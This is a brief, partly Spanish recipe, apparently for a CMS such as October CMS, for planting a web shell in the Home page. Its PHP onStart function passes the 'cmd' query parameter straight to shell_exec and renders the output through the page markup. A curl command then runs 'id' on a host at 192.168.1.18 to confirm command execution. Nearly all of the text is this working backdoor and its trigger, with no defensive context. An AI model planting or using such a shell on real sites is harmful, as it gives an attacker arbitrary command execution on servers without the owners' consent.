
CMS -> Pages -> Home -> Code
```
function onStart()
{
	$this->page["evilVar"] = shell_exec($_GET['cmd']);
}
```

CMS -> Pages -> Home -> Markup
```
{{ this.page.evilVar }}
````

Ejecutar comandos
```
curl 'http://192.168.1.18/?cmd=id' 2>&1 | grep uid
```